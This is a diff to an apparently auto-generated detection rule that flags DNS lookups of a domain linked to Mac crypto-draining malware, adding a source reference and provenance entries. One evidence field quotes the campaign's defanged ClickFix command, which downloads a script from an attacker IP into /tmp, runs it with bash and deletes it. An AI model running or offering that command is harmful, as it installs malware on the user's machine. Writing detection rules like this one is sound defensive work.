@@ -1,12 +1,13 @@
 title: DNS lookup of a domain named in the source intelligence
-id: cdb989b2-3f34-42f3-b526-adcd7f47be26
+id: 46be85dd-ba39-4297-a87b-faeb51b24573
 status: experimental
 description: Deterministic IOC rule built from the indicators the source intelligence published, with
   no model involvement. Matches a DNS query for a current domain or host the source published, or a subdomain
   of a published domain. Indicators the source marks historical are excluded.
-references: []
+references:
+- https://www.huntress.com/blog/mac-crypto-draining-malware
 author: hecate (auto-generated from source indicators - requires analyst review)
-date: '2026-11-15'
+date: '2026-11-25'
 tags: []
 logsource:
   category: dns_query
@@ -23,18 +24,19 @@ falsepositives:
 - Security tooling or analysts resolving the indicators themselves
 level: high
 hecate_provenance:
-- value: profitnow.io
-  type: domain
-  role: delivery
-  status: unknown
-  confidence: unknown
-  source: cti
 - value: https://profitnow.io/
   type: url
-  role: unknown
-  status: unknown
+  role: staging
+  status: active
   confidence: unknown
-  source: cti
+  source: https://www.huntress.com/blog/mac-crypto-draining-malware
+  evidence: export SRC_URL='https://profitnow[.]io/' && (cd /tmp && curl -kfsSL "http://193.29.224[.]151/92392991a0cca55?force=1"
+    -o .UlaccK && bash .UlaccK && rm -f .UlaccK)
+- value: profitnow.io
+  type: domain
+  role: staging
+  status: active
+  confidence: unknown
+  source: https://www.huntress.com/blog/mac-crypto-draining-malware
+  evidence: '`profitnow[.]io` Domain used during the ClickFix phase'
 hunt_id: H-0038
-x_hecate_replay_matched: true
-x_hecate_synthetic_holdout_status: failed
